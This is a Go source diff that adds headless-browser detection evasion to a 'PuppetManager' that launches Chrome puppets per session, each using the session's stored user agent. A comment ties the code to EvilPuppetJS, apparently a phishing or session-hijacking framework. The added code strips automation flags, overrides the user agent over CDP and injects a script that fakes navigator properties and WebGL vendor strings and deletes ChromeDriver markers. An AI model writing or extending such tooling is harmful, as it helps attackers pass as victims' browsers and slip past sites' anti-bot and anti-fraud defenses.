@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"github.com/chromedp/cdproto/cdp"
+	"github.com/chromedp/cdproto/emulation"
 	"github.com/chromedp/cdproto/input"
 	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/cdproto/page"
@@ -213,16 +214,7 @@ func (pm *PuppetManager) LaunchPuppet(sessionId int, targetURL string) (*PuppetI
 }
 
 func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.Session) {
-	opts := append(chromedp.DefaultExecAllocatorOptions[:],
-		chromedp.Flag("headless", true),
-		chromedp.Flag("disable-gpu", true),
-		chromedp.Flag("no-sandbox", true),
-		chromedp.Flag("disable-dev-shm-usage", true),
-		chromedp.Flag("disable-web-security", false),
-		chromedp.Flag("disable-features", "VizDisplayCompositor"),
-		chromedp.WindowSize(puppet.viewportW, puppet.viewportH),
-		chromedp.UserAgent(dbSession.UserAgent),
-	)
+	opts := StealthChromeOpts(dbSession.UserAgent, puppet.viewportW, puppet.viewportH)
 
 	if pm.chromePath != "" {
 		opts = append(opts, chromedp.ExecPath(pm.chromePath))
@@ -245,6 +237,9 @@ func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.S
 		log.Error("puppet [%d]: %s", puppet.Id, puppet.Error)
 		return
 	}
+
+	// Inject stealth scripts and set UA override via CDP (covers navigator.userAgent + platform)
+	InjectStealthScripts(ctx, dbSession.UserAgent)
 
 	// Auto-dismiss JavaScript dialogs
 	chromedp.ListenTarget(ctx, func(ev interface{}) {
@@ -896,6 +891,107 @@ func (pm *PuppetManager) GetDashboardURL() string {
 		serverIP = "your-server-ip"
 	}
 	return fmt.Sprintf("http://%s:%d/puppet/?key=%s", serverIP, pm.port, pm.password)
+}
+
+// StealthChromeOpts returns chromedp allocator options configured to evade headless browser
+// detection. Equivalent to puppeteer-extra-plugin-stealth's Chrome launch args.
+func StealthChromeOpts(userAgent string, viewportW, viewportH int) []chromedp.ExecAllocatorOption {
+	opts := append(chromedp.DefaultExecAllocatorOptions[:],
+		chromedp.Flag("headless", true),
+		chromedp.Flag("disable-gpu", true),
+		chromedp.Flag("no-sandbox", true),
+		chromedp.Flag("disable-dev-shm-usage", true),
+		chromedp.Flag("disable-web-security", false),
+		chromedp.WindowSize(viewportW, viewportH),
+		chromedp.UserAgent(userAgent),
+
+		// Stealth flags — remove automation markers
+		chromedp.Flag("enable-automation", false),
+		chromedp.Flag("disable-blink-features", "AutomationControlled"),
+		chromedp.Flag("excludeSwitches", "enable-automation"),
+		chromedp.Flag("disable-features", "TranslateUI,VizDisplayCompositor"),
+		chromedp.Flag("disable-infobars", true),
+		chromedp.Flag("disable-extensions", true),
+	)
+	return opts
+}
+
+// InjectStealthScripts injects JavaScript and CDP overrides to evade headless browser detection.
+// This is the Go equivalent of puppeteer-extra-plugin-stealth used by EvilPuppetJS.
+// Must be called after browser context is created but before navigating to the target.
+func InjectStealthScripts(ctx context.Context, userAgent string) {
+	// Set user-agent override via CDP (more thorough than command-line flag)
+	platform := "Win32"
+	if strings.Contains(userAgent, "Macintosh") {
+		platform = "MacIntel"
+	} else if strings.Contains(userAgent, "Linux") {
+		platform = "Linux x86_64"
+	}
+
+	chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
+		// CDP-level user agent override — sets navigator.userAgent, navigator.platform, etc.
+		if err := emulation.SetUserAgentOverride(userAgent).
+			WithPlatform(platform).
+			WithAcceptLanguage("en-US,en;q=0.9").
+			Do(ctx); err != nil {
+			return err
+		}
+		// Inject stealth script into every document before any page scripts run
+		_, err := page.AddScriptToEvaluateOnNewDocument(stealthScript).Do(ctx)
+		return err
+	}))
+}
+
+// stealthScript is injected into every page in the puppet browser before any site scripts run.
+// It patches the JavaScript environment to remove traces of headless Chrome / automation,
+// equivalent to puppeteer-extra-plugin-stealth's evasions.
+var stealthScript = buildStealthScript()
+
+func buildStealthScript() string {
+	return "(function() {" +
+		// navigator.webdriver
+		"Object.defineProperty(navigator,'webdriver',{get:()=>undefined});" +
+		// window.chrome
+		"if(!window.chrome)window.chrome={};" +
+		"if(!window.chrome.runtime){window.chrome.runtime={onConnect:undefined,onMessage:undefined," +
+		"sendMessage:function(){},connect:function(){return{onMessage:{addListener:function(){}},postMessage:function(){}};}}}" +
+		"window.chrome.csi=function(){return{}};" +
+		"window.chrome.loadTimes=function(){return{}};" +
+		"if(!window.chrome.app){window.chrome.app={isInstalled:false,getDetails:function(){}," +
+		"getIsInstalled:function(){},installState:function(){return'disabled'},runningState:function(){return'cannot_run'}}}" +
+		// navigator.plugins
+		"Object.defineProperty(navigator,'plugins',{get:function(){var a=[" +
+		"{name:'Chrome PDF Plugin',filename:'internal-pdf-viewer',description:'Portable Document Format',length:1}," +
+		"{name:'Chrome PDF Viewer',filename:'mhjfbmdgcfjbbpaeojofohoefgiehjai',description:'',length:1}," +
+		"{name:'Native Client',filename:'internal-nacl-plugin',description:'',length:2}];a.refresh=function(){};return a}});" +
+		// navigator.mimeTypes
+		"Object.defineProperty(navigator,'mimeTypes',{get:function(){return[" +
+		"{type:'application/pdf',suffixes:'pdf',description:'Portable Document Format'}," +
+		"{type:'application/x-google-chrome-pdf',suffixes:'pdf',description:'Portable Document Format'}]}});" +
+		// navigator.languages
+		"Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});" +
+		// navigator.permissions.query
+		"if(navigator.permissions){var oq=navigator.permissions.query.bind(navigator.permissions);" +
+		"navigator.permissions.query=function(p){if(p.name==='notifications')return Promise.resolve({state:Notification.permission});return oq(p)}}" +
+		// navigator.connection
+		"if(!navigator.connection){Object.defineProperty(navigator,'connection',{get:()=>({effectiveType:'4g',rtt:50,downlink:10,saveData:false})})}" +
+		// window outer dimensions
+		"if(window.outerWidth===0)Object.defineProperty(window,'outerWidth',{get:()=>window.innerWidth});" +
+		"if(window.outerHeight===0)Object.defineProperty(window,'outerHeight',{get:()=>window.innerHeight+85});" +
+		// WebGL vendor/renderer (hide SwiftShader)
+		"try{var gp=WebGLRenderingContext.prototype.getParameter;WebGLRenderingContext.prototype.getParameter=function(p){" +
+		"if(p===37445)return'Intel Inc.';if(p===37446)return'Intel Iris OpenGL Engine';return gp.call(this,p)}}catch(e){}" +
+		"try{var gp2=WebGL2RenderingContext.prototype.getParameter;WebGL2RenderingContext.prototype.getParameter=function(p){" +
+		"if(p===37445)return'Intel Inc.';if(p===37446)return'Intel Iris OpenGL Engine';return gp2.call(this,p)}}catch(e){}" +
+		// Remove CDP markers
+		"try{var ks=Object.keys(window);for(var i=0;i<ks.length;i++){if(/^(cdc_|__cdc_)/.test(ks[i])){try{delete window[ks[i]]}catch(e){}}}}catch(e){}" +
+		// Notification
+		"if(typeof Notification==='undefined')window.Notification={permission:'default'};" +
+		// navigator.hardwareConcurrency
+		"if(navigator.hardwareConcurrency<2)Object.defineProperty(navigator,'hardwareConcurrency',{get:()=>4});" +
+		// navigator.deviceMemory
+		"if(!navigator.deviceMemory||navigator.deviceMemory<4)Object.defineProperty(navigator,'deviceMemory',{get:()=>8});" +
+		"})()"
 }
 
 // keyToVirtualKeyCode maps JavaScript key names to Windows virtual key codes.
